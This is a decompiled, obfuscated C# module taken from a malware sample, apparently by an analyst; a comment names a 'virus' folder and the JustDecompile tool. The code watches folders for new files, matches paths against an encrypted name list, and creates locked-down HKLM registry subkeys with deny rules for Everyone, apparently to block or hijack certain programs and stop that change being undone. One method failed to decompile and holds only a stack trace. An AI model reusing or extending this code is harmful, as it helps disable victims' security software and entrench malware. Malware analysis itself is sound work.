using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.AccessControl;
using System.Security.Principal;

[StandardModule]
internal sealed class ____________________________________________________________
{
	[AccessedThroughProperty("SystemShield")]
	private static FileSystemWatcher _;

	public static string __;

	public static string ___;

	public static FileSystemWatcher _
	{
		get
		{
			return ____________________________________________________________._;
		}
		set
		{
			FileSystemEventHandler fileSystemEventHandler = new FileSystemEventHandler(____________________________________________________________._______);
			if (____________________________________________________________._ != null)
			{
				____________________________________________________________._.Created -= fileSystemEventHandler;
			}
			____________________________________________________________._ = value;
			if (____________________________________________________________._ != null)
			{
				____________________________________________________________._.Created += fileSystemEventHandler;
			}
		}
	}

	static ____________________________________________________________()
	{
		int length;
		____________________________________________________________._ = new FileSystemWatcher();
		int num = Type.EmptyTypes.Length + 35646;
		int ________ = <Module>.______________;
		if ((________ % 32768 - 8859) * 64 - 191424 != ~(________ * 606656))
		{
			length = Type.EmptyTypes.Length + 35488;
		}
		else
		{
			length = (1879048192 + 1073741824 * ________ == ________ >> 29 ? Type.EmptyTypes.Length + 767672879 : (int)(sizeof(Guid) + -1581283094));
		}
		____________________________________________________________.___ = <Module>.__________(num, length, 157);
	}

	public static void ___(string string_0)
	{
		try
		{
			if (____________________________________________________________._____(string_0))
			{
				_________________________________________________.___________(string_0.ToString());
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void ____(string string_0)
	{
		try
		{
			string[] directories = Directory.GetDirectories(string_0);
			for (int i = 0; i < checked((int)directories.Length); i++)
			{
				string str = directories[i];
				try
				{
					if (____________________________________________________________._____(str))
					{
						_________________________________________________.___________(str);
					}
				}
				catch (Exception exception)
				{
					ProjectData.SetProjectError(exception);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			ProjectData.ClearProjectError();
		}
	}

	public static bool _____(string string_0)
	{
		int i = 0;
		string[] strArrays = null;
		int num = 0;
		bool flag;
		try
		{
			if (Operators.CompareString(____________________________________________________________.___, <Module>.__________(Type.EmptyTypes.Length + 4122, Type.EmptyTypes.Length + 6121, Type.EmptyTypes.Length + 46), false) != 0)
			{
				strArrays = Strings.Split(____________________________________________________________.___, <Module>._____<string>(-1479692421), -1, CompareMethod.Binary);
				if ((num * 4096 ^ 5668) != 0 && (-(num * 8192) ^ 6507) != 0)
				{
					switch ((~(6510 + i / 381234) == 9304 ? sizeof(uint) + 1850919753 : sizeof(long) + -8))
					{

					}
				}
			}
			else
			{
				num = -25394;
				if (sizeof(long) + -24915 != 25022)
				{
					flag = false;
					return flag;
				}
			}
			string str = Strings.StrConv(string_0.ToString(), VbStrConv.Lowercase, 0);
			string[] strArrays1 = strArrays;
			for (i = 0; i < checked((int)strArrays1.Length); i++)
			{
				string str1 = strArrays1[i];
				try
				{
					if (Operators.CompareString(str1, <Module>.__________(Type.EmptyTypes.Length + 47130, Type.EmptyTypes.Length + 49350, 134), false) != 0 && str.Contains(str1))
					{
						flag = true;
						return flag;
					}
				}
				catch (Exception exception)
				{
					ProjectData.SetProjectError(exception);
					ProjectData.ClearProjectError();
				}
			}
			flag = false;
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			flag = false;
			ProjectData.ClearProjectError();
		}
		return flag;
	}

	public static void ______()
	{
		try
		{
			____________________________________________________________.___ = __________________________________________________________________.____(<Module>.___<string>(-1307486036));
			____________________________________________________________._.Filter = <Module>.___<string>(-286239852);
			____________________________________________________________._.NotifyFilter = NotifyFilters.FileName;
			____________________________________________________________._.Path = string.Concat(Environment.GetEnvironmentVariable(<Module>._______<string>(404507950)), <Module>.____<string>(-2143068903));
			____________________________________________________________._.IncludeSubdirectories = true;
			____________________________________________________________._.EnableRaisingEvents = true;
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	private static void _______(object sender, FileSystemEventArgs e)
	{
		// 
		// Current member / type: System.Void ____________________________________________________________::_______(System.Object,System.IO.FileSystemEventArgs)
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void _______(System.Object,System.IO.FileSystemEventArgs)
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public static void ________(string string_0)
	{
		unsafe
		{
			RegistryKey registryKey = null;
			int num = 0;
			RegistryKey registryKey1 = null;
			int length;
			SecurityIdentifier securityIdentifier = null;
			string str = null;
			object obj;
			try
			{
				while (true)
				{
					if (!___________________________________________________________________.________())
					{
						goto Label0;
					}
					if (!string_0.Contains(<Module>.___<string>(-1119421283)))
					{
						length = 6561;
						if (checked((int)2198) == 17450)
						{
							goto Label1;
						}
						return;
					}
					else
					{
						if (!string_0.Contains(<Module>._____<string>(305124521)))
						{
							break;
						}
						string_0 = Path.GetFileName(string_0);
						length = 9409;
						if ((num - 862 & 1) == (1 & num))
						{
							break;
						}
					}
				}
				registryKey1 = Registry.LocalMachine.OpenSubKey(<Module>._______<string>(-191972911), true);
				registryKey1.CreateSubKey(string_0);
				length = Type.EmptyTypes.Length + 243;
				obj = Type.EmptyTypes.Length + 0;
			Label5:
				while (true)
				{
					switch (obj)
					{
						case 0:
						{
							do
							{
								registryKey1.Close();
								registryKey = Registry.LocalMachine.OpenSubKey(string.Concat(<Module>._____<string>(1224194589), string_0), true);
								if (length == 243)
								{
									registryKey.SetValue(<Module>.______<string>(97836900), <Module>._______<string>(1744436544));
									securityIdentifier = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
								}
								else
								{
									return;
								}
							}
							while ((length / 517070 - 8388608 * length ^ 36694) == 0);
							if ((-5238 | length * -188743680) != -5238)
							{
								obj = Type.EmptyTypes.Length + -1825220696;
								continue;
							}
							else
							{
								if ((8388608 & length >> 9) == (length - (length - 3954) << 23 & 8388608))
								{
									goto Label1;
								}
								obj = sizeof(long) + 1608578384;
								continue;
							}
						}
						case 1:
						{
							break;
						}
						case 2:
						{
							goto Label1;
						}
						default:
						{
							goto case 0;
						}
					}
				}
				RegistrySecurity registrySecurity = new RegistrySecurity();
				registrySecurity.AddAccessRule(new RegistryAccessRule(str, RegistryRights.ExecuteKey, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow));
				registrySecurity.AddAccessRule(new RegistryAccessRule(str, RegistryRights.SetValue | RegistryRights.CreateSubKey | RegistryRights.Delete | RegistryRights.ChangePermissions | RegistryRights.TakeOwnership, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny));
				registryKey.SetAccessControl(registrySecurity);
				registryKey.Close();
			Label0:
			}
			catch (Exception exception)
			{
				ProjectData.SetProjectError(exception);
				ProjectData.ClearProjectError();
			}
			return;
		Label1:
			NTAccount nTAccount = securityIdentifier.Translate(typeof(NTAccount)) as NTAccount;
			str = nTAccount.ToString();
			if (length / 32 == 1796913459)
			{
				obj = Type.EmptyTypes.Length + 393597365;
				goto Label5;
			}
			else
			{
				obj = Type.EmptyTypes.Length + 1;
				goto Label5;
			}
		}
	}
}